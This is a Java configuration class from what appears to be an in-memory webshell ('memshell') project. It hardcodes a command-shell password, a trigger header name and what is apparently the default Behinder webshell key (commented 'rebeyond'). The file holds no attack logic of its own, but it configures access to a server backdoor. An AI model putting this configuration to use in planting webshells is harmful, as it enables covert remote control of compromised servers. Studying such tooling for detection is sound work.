package com.memshell.generic;

public class Config {
    private final static String basicCmdShellPwd = "pass";
    private final static String behinderShellHeader = "X-Options-Ai";
    private final static String behinderShellPwd = "e45e329feb5d925b"; // rebeyond

    public static String getPassword(){
        return basicCmdShellPwd;
    }

    public static String getHeader(){
        return behinderShellHeader;
    }

    public static String getBehinderShellPwdPwd(){
        return behinderShellPwd;
    }
}
